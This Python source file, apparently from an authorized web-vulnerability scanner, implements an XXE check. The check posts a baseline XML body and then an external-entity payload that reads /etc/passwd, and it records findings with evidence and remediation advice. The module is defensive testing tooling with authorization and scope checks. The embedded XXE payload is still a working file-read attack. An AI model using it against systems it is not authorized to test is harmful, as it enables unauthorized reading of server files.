import logging
from typing import Callable
from urllib.parse import urlparse

from hunterbot.core.domain import Confidence, Finding, Severity, VulnerabilityCategory, target_matches
from hunterbot.core.interfaces import (
    ActiveHttpClient,
    AuthorizationChecker,
    AuthSessionRepository,
    FindingRepository,
    ScopeRepository,
)

logger = logging.getLogger(__name__)

SCANNER_NAME = "xxe"

# A plain document with no DOCTYPE, sent first so its response can serve as
# a baseline -- an XXE payload's own response is compared against this
# rather than a GET of "/", since the target endpoint may not even respond
# to GET (most XML-accepting endpoints are POST-only).
_BASELINE_XML = '<?xml version="1.0"?><r>hunterbot-baseline</r>'

# A classic external-entity file-read payload: /etc/passwd is the
# industry-standard, non-destructive XXE proof target (world-readable on
# every Unix system, identifiable by a distinctive, stable format -- never
# actually sensitive on a modern system, since real credentials live in
# /etc/shadow instead).
_XXE_PAYLOAD = (
    '<?xml version="1.0"?>'
    "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]>"
    "<r>&x;</r>"
)

_FILE_READ_SIGNATURES = ("root:", ":0:0:")

_PARSER_ERROR_SIGNATURES = (
    "failed to load external entity",
    "external entity",
    "org.xml.sax.saxparseexception",
    "system.xml.xmlexception",
    "xmlsyntaxerror",
    "doctype is not allowed",
    "dtd is prohibited",
    "entity resolution is disabled",
)


class RunXxeScanUseCase:
    """Confirms XXE by actually posting a crafted XML body and reading the reply.

    HunterBot cannot discover which endpoint accepts XML on its own -- the
    tester names it. This is a state-changing (POST) use-case, alongside
    RunRaceConditionScanUseCase and RunFileUploadRceScanUseCase -- see
    hunterbot.core.interfaces.ActiveHttpClient. Real XXE overwhelmingly
    manifests through POST bodies (SOAP endpoints, XML import features,
    file-format parsers), not GET query parameters, which is why this
    isn't a read-only ScannerPlugin the way SqlInjectionScanner or
    SsrfScanner are.

    Two requests, both compared against each other rather than any GET
    baseline (many XML-accepting endpoints don't respond to GET at all):
    a plain, DOCTYPE-free XML body first, then the actual payload -- an
    external entity pointing at /etc/passwd. Two outcomes:
      - the response contains /etc/passwd's own distinctive content
        ("root:", ":0:0:") that wasn't in the baseline -> CONFIRMED,
        CRITICAL: direct proof of a server-side file read.
      - the response contains an XML parser's own external-entity/DOCTYPE
        error message not present in the baseline -> MEDIUM, MEDIUM:
        the parser reached the entity declaration (so external entities
        aren't disabled), but no content was actually read back.
      - neither -> no finding.
    """

    def __init__(
        self,
        *,
        authorization_checker: AuthorizationChecker,
        auth_session_repository: AuthSessionRepository,
        scope_repository: ScopeRepository,
        finding_repository: FindingRepository,
        active_http_client_factory: Callable[[str, dict[str, str] | None], ActiveHttpClient],
    ) -> None:
        self._authorization = authorization_checker
        self._auth_sessions = auth_session_repository
        self._scopes = scope_repository
        self._findings = finding_repository
        self._http_client_factory = active_http_client_factory

    def execute(self, *, base_url: str, target_path: str, session_id: int | None = None) -> list[Finding]:
        hostname = urlparse(base_url).hostname
        if hostname is None:
            raise ValueError(f"could not determine a hostname from {base_url!r}")
        self._authorization.authorize(hostname)

        headers = None
        if session_id is not None:
            headers = self._resolve_session_headers(session_id, hostname)

        http_client = self._http_client_factory(base_url, headers)
        try:
            baseline_response = http_client.post(target_path, body=_BASELINE_XML, content_type="application/xml")
            baseline_text = baseline_response.text.lower() if baseline_response is not None else ""

            payload_response = http_client.post(target_path, body=_XXE_PAYLOAD, content_type="application/xml")
            if payload_response is None:
                return []

            body_lower = payload_response.text.lower()

            if all(signature in body_lower for signature in _FILE_READ_SIGNATURES) and not all(
                signature in baseline_text for signature in _FILE_READ_SIGNATURES
            ):
                finding = self._build_finding(
                    base_url=base_url,
                    target_path=target_path,
                    response_url=payload_response.url,
                    outcome="file-read",
                    detail="the response contained /etc/passwd's own content",
                    status_code=payload_response.status_code,
                )
                return [self._findings.add(finding)]

            matched_signature = next(
                (
                    signature
                    for signature in _PARSER_ERROR_SIGNATURES
                    if signature in body_lower and signature not in baseline_text
                ),
                None,
            )
            if matched_signature is not None:
                finding = self._build_finding(
                    base_url=base_url,
                    target_path=target_path,
                    response_url=payload_response.url,
                    outcome="parser-error",
                    detail=f"an XML parser error ({matched_signature!r}) appeared",
                    status_code=payload_response.status_code,
                )
                return [self._findings.add(finding)]

            return []
        finally:
            http_client.close()

    def _resolve_session_headers(self, session_id: int, hostname: str) -> dict[str, str]:
        auth_session = self._auth_sessions.get(session_id)
        if auth_session is None:
            raise ValueError(f"no session with id {session_id}")
        if not auth_session.is_currently_active():
            raise ValueError(f"session #{session_id} has expired")
        owning_scope = self._scopes.get(auth_session.scope_id)
        if owning_scope is None or not target_matches(owning_scope.target, hostname):
            raise ValueError(f"session #{session_id} belongs to a scope that does not authorize {hostname!r}")
        return auth_session.headers

    def _build_finding(
        self,
        *,
        base_url: str,
        target_path: str,
        response_url: str,
        outcome: str,
        detail: str,
        status_code: int,
    ) -> Finding:
        if outcome == "file-read":
            return Finding(
                title=f"XXE confirmed via external entity file read at {target_path}",
                category=VulnerabilityCategory.INPUT_VALIDATION,
                severity=Severity.CRITICAL,
                confidence=Confidence.CONFIRMED,
                description=(
                    f"Posting an XML body with a DOCTYPE declaring an external entity "
                    f"(SYSTEM \"file:///etc/passwd\") to {target_path} caused {detail}, not present "
                    "when a plain, DOCTYPE-free baseline body was posted -- direct proof the parser "
                    "resolved the external entity and read a local file."
                ),
                affected_asset=base_url,
                location=response_url,
                evidence=f"HTTP {status_code} response body contained /etc/passwd's distinctive content ('root:', ':0:0:').",
                reproduction_steps=(
                    f"POST the same DOCTYPE/external-entity payload to {target_path} and confirm the "
                    "response contains /etc/passwd's contents."
                ),
                remediation=(
                    "Disable DTD processing and external entity resolution in the XML parser "
                    "(most libraries default to safe behavior in current versions -- confirm the one "
                    "in use here isn't configured to opt back in)."
                ),
                scanner_name=SCANNER_NAME,
            )
        return Finding(
            title=f"XML parser accepts external entity declarations at {target_path}",
            category=VulnerabilityCategory.INPUT_VALIDATION,
            severity=Severity.MEDIUM,
            confidence=Confidence.MEDIUM,
            description=(
                f"Posting an XML body with a DOCTYPE declaring an external entity to {target_path} "
                f"caused {detail}, not present when a plain, DOCTYPE-free baseline body was posted -- "
                "the parser attempted to process the external entity, though no file content came "
                "back in this response. Confirm manually with an out-of-band listener or a "
                "different target file before reporting as fully exploitable."
            ),
            affected_asset=base_url,
            location=response_url,
            evidence=f"HTTP {status_code} response body contained an XML parser error signature not present in the baseline.",
            reproduction_steps=(
                f"POST the same DOCTYPE/external-entity payload to {target_path} and compare against "
                "a DOCTYPE-free baseline body."
            ),
            remediation=(
                "Disable DTD processing and external entity resolution in the XML parser entirely, "
                "regardless of whether this specific payload read a file."
            ),
            scanner_name=SCANNER_NAME,
        )
